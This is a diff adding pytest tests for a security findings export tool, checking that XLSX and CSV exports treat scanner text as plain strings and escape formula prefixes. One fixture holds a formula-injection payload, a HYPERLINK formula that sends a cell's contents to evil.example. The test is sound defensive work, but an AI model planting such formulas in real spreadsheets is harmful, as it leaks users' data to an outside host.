@@ -107,3 +107,65 @@ def test_route_returns_attachment(monkeypatch):
     assert resp.media_type.endswith("spreadsheetml.sheet")
     disp = resp.headers["content-disposition"]
     assert 'filename="vedha-remediation-Bank-VA-Q3-' in disp and disp.endswith('.xlsx"')
+
+
+def _hostile_sheets():
+    """A finding title is scanner-derived text — a hostile banner can start with '='."""
+    sheets = _sheets()
+    head, rows = sheets["Findings"]
+    rows[0][1] = '=HYPERLINK("http://evil.example/?x="&A1,"click")'
+    rows[1][1] = "@SUM(1+1)"
+    return sheets
+
+
+def test_xlsx_never_stores_scanner_text_as_a_formula():
+    wb = load_workbook(io.BytesIO(X.to_xlsx(_hostile_sheets(), title="t")))
+    ws = wb["Findings"]
+    titles = [ws.cell(row=r, column=2) for r in (2, 3)]
+    assert all(c.data_type == "s" for c in titles)
+    assert titles[0].value.startswith('=HYPERLINK')          # shown verbatim, never evaluated
+
+
+def test_csv_neutralises_formula_prefixes():
+    data = X.to_csv(_hostile_sheets(), "Findings")
+    rows = list(csv.reader(io.StringIO(data.decode("utf-8-sig"))))
+    assert rows[1][1].startswith("'=HYPERLINK") and rows[2][1] == "'@SUM(1+1)"
+    zipped = X.to_csv_zip(_hostile_sheets())
+    with zipfile.ZipFile(io.BytesIO(zipped)) as zf:
+        zrows = list(csv.reader(io.StringIO(zf.read("findings.csv").decode("utf-8-sig"))))
+    assert zrows[1][1].startswith("'=")
+
+
+def test_csv_single_sheet():
+    data = X.to_csv(_sheets(), "Findings")
+    assert data.startswith("﻿".encode())                 # Excel opens UTF-8 correctly
+    rows = list(csv.reader(io.StringIO(data.decode("utf-8-sig"))))
+    assert rows[0][0] == "Finding ID" and len(rows) == 3
+    assert "2026-10-11 12:00" in {c for r in rows for c in r}
+
+
+def test_route_single_csv_sheet(monkeypatch):
+    from app.remediation import service as RS
+    from app.routers import remediation
+    from app.schemas.auth import CurrentUser
+
+    async def fake_bundles(db, engagement, tenant_id):
+        items = _items()
+        return {"bundles": build_bundles(items, now=NOW), "items": items, "sla_source": "engagement"}
+
+    monkeypatch.setattr(RS, "engagement_bundles", fake_bundles)
+    eng = SimpleNamespace(id=uuid.uuid4(), name="Bank VA")
+
+    class _DB:
+        async def execute(self, *a, **k):
+            r = MagicMock()
+            r.scalar_one_or_none = MagicMock(return_value=eng)
+            r.scalars = MagicMock(return_value=MagicMock(all=MagicMock(return_value=[])))
+            return r
+
+    user = CurrentUser(user_id=uuid.uuid4(), tenant_id=uuid.uuid4(), role="analyst")
+    resp = asyncio.run(remediation.export_remediation(eng.id, _DB(), user, format="csv", sheet="findings"))
+    assert resp.media_type.startswith("text/csv")
+    disp = resp.headers["content-disposition"]
+    assert "vedha-findings-Bank-VA-" in disp and disp.endswith('.csv"')
+    assert resp.body.decode("utf-8-sig").startswith("Finding ID,")
